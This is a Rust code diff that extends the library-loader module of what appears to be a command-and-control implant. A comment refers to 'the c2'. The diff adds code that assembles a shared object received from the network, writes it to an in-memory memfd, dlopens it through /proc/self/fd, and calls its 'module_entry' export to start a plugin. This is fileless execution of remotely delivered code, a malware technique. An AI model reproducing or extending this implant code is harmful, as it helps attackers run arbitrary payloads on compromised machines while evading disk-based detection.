@@ -1,9 +1,9 @@
 use std::ffi::{CString, c_void};
-use libc::dlopen;
+use libc::{dlopen, dlsym};
 use tokio::sync::mpsc::{Receiver, Sender};
 use tokio_util::sync::CancellationToken;
 use sozo_api::{Module, ModuleIdentity, BusMessage, sozo_debug};
-use sozo_api::plugin::PluginModule;
+use sozo_api::plugin::{ModuleVTable, PluginModule};
 use tokio::sync::Mutex;
 
 struct FileDescriptor {
@@ -39,14 +39,14 @@ impl Drop for FileDescriptor {
 
 #[derive(Debug)]
 enum LoadError {
-    InvalidLength,
-    Critical
-}
-
-enum LoadStatus {
-    Error(LoadError),
+    Critical,
     Waiting,
-    Complete(Vec<u8>)
+    InvalidLength,
+    UnableToMemCreate,
+    UnableToWrite,
+    UnableToDlOpen,
+    ExportNotFound,
+    UnableToCreateInstance
 }
 
 enum LoadState {
@@ -75,23 +75,23 @@ impl LibraryLoader {
         }
     }
 
-    fn handle_inbound_msg(&self, state: &mut LoadState, msg: &[u8]) -> LoadStatus {
+    fn handle_inbound_msg(&self, state: &mut LoadState, msg: &[u8]) -> Result<Vec<u8>, LoadError> {
         const MAX_SO_SIZE : usize = 1024 * 1024;
 
         match state {
             LoadState::Idle => {
                 if msg.len() != size_of::<u32>() {
-                    return LoadStatus::Error(LoadError::InvalidLength);
+                    return Err(LoadError::InvalidLength);
                 }
 
                 let so_size = u32::from_be_bytes(msg.try_into().unwrap()) as usize;
                 if so_size > MAX_SO_SIZE {
-                    return LoadStatus::Error(LoadError::InvalidLength);
+                    return Err(LoadError::InvalidLength);
                 }
 
                 let mut so_data: Vec<u8> = Vec::new();
                 if so_data.try_reserve(so_size).is_err() {
-                    return LoadStatus::Error(LoadError::Critical);
+                    return Err(LoadError::Critical);
                 }
 
                 *state = LoadState::Loading {
@@ -99,12 +99,12 @@ impl LibraryLoader {
                     so_data
                 };
 
-                LoadStatus::Waiting
+                Err(LoadError::Waiting)
             },
             LoadState::Loading {so_size, so_data} => {
                 let remaining_size = *so_size - so_data.len();
                 if msg.len() > remaining_size {
-                    return LoadStatus::Error(LoadError::InvalidLength);
+                    return Err(LoadError::InvalidLength);
                 }
 
                 so_data.extend_from_slice(msg);
@@ -112,26 +112,26 @@ impl LibraryLoader {
                 if so_data.len() == *so_size {
                     let so = std::mem::take(so_data);
                     *state = LoadState::Idle;
-                    return LoadStatus::Complete(so);
+                    return Ok(so);
                 }
 
-                LoadStatus::Waiting
+                Err(LoadError::Waiting)
             }
         }
     }
 
-    fn load_shared_object(&self, lib_so: &[u8]) -> Result<(), ()> {
+    fn load_shared_object(&self, lib_so: &[u8]) -> Result<*mut c_void, LoadError> {
 
         let fd = unsafe {
             libc::memfd_create(c"plugin".as_ptr(), libc::MFD_CLOEXEC)
         };
 
         if fd < 0 {
-            return Err(());
+            return Err(LoadError::UnableToMemCreate);
         }
 
         let Ok(fd) = FileDescriptor::try_from(fd) else {
-            return Err(())
+            return Err(LoadError::Critical)
         };
 
         let result = unsafe {
@@ -139,13 +139,13 @@ impl LibraryLoader {
         };
 
         if -1 == result || lib_so.len() as isize != result {
-            return Err(());
+            return Err(LoadError::UnableToWrite);
         }
 
         let file_path = match CString::new(format!("/proc/self/fd/{}", fd.as_raw())) {
             Ok(path) => path,
             Err(_) => {
-                return Err(());
+                return Err(LoadError::Critical);
             }
         };
 
@@ -154,12 +154,48 @@ impl LibraryLoader {
         };
 
         if address.is_null() {
-            return Err(());
+            return Err(LoadError::UnableToDlOpen);
         }
 
-        Ok(())
+        Ok(address)
     }
 
+    fn create_plugin(&self, so_addr: *mut c_void) -> Result<PluginModule, LoadError> {
+        if so_addr.is_null() {
+            return Err(LoadError::Critical);
+        }
+
+        let export_name = match CString::new("module_entry") {
+            Ok(name) => name,
+            Err(_) => return Err(LoadError::Critical)
+        };
+
+        let export_addr = unsafe {
+            dlsym(so_addr, export_name.as_ptr())
+        };
+
+        if export_addr.is_null() {
+            return Err(LoadError::ExportNotFound);
+        }
+
+        let module_entry: extern "C" fn() -> * const ModuleVTable = unsafe { std::mem::transmute(export_addr) };
+
+        let module_vtable = module_entry();
+        if module_vtable.is_null() {
+            return Err(LoadError::Critical);
+        }
+
+        let instance = unsafe { ((*module_vtable).init)() };
+        if instance.is_null() {
+            return Err(LoadError::UnableToCreateInstance);
+        }
+
+        Ok(PluginModule::new(
+            so_addr,
+            module_vtable,
+            instance)
+        )
+    }
 }
 
 #[async_trait::async_trait]
@@ -188,18 +224,35 @@ impl Module for LibraryLoader {
                         }
 
                         let lib_so = match self.handle_inbound_msg(&mut state, &msg.msg) {
-                            LoadStatus::Waiting => {
+                            Ok(lib_so) => lib_so,
+                            Err(LoadError::Waiting) => {
                                 sozo_debug!("LibraryLoader::run", "waiting triggered -- waiting for additional inbound packets to build shared object");
                                 continue;
                             },
-                            LoadStatus::Error(_) => {
+                            Err(_) => {
                                 sozo_debug!("LibraryLoader::run", "critical error or violation to network protocol");
                                 break;
                             },
-                            LoadStatus::Complete(lib_so) => lib_so
                         };
 
+                        let so_addr = match self.load_shared_object(&lib_so) {
+                            Ok(addr) => addr,
+                            Err(LoadError::Critical) => break,
+                            Err(err) => {
+                                //todo: take the error and return a response back to the c2 and then continu
+                                sozo_debug!("LibraryLoader::run", "load_shared_object returned err -- {:?}", err);
+                                continue;
+                            }
+                        };
 
+                        let plugin = match self.create_plugin(so_addr) {
+                            Ok(plugin) => plugin,
+                            Err(LoadError::Critical) => break,
+                            Err(err) => {
+                                sozo_debug!("LibraryLoader::run", "create_plugin returned err {:?}", err);
+                                continue;
+                            }
+                        };
 
 
 
@@ -217,11 +270,4 @@ impl Module for LibraryLoader {
     }
 }
 
-    // once its loaded and we have a vtable, we can then wrap into a plugin module
-    // search for module_entry
-    // get vtable
-    // wrap into plugin module
-    // register to bus
-
-    // need to build some kind of message system that permits adding to bus at runtime -- ie sep control channel?
-    // most likey a control channel that sends messages of callback functions thatpermit registeration and staring, etc.
+// need to craft the error response back to shell module from load and create -- currently just `continue`
